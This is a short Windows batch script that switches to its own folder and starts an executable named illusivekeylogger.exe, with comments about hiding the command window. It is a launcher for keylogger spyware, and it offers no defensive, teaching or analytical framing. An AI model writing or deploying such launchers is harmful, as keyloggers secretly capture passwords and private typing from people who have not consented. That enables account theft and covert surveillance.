@echo off
:: Change to the directory where the keylogger is located
cd /d "%~dp0"

:: Run the keylogger executable
start illusivekeylogger.exe

:: Optionally, add a message or hidden launch
:: Hide the command window
exit
 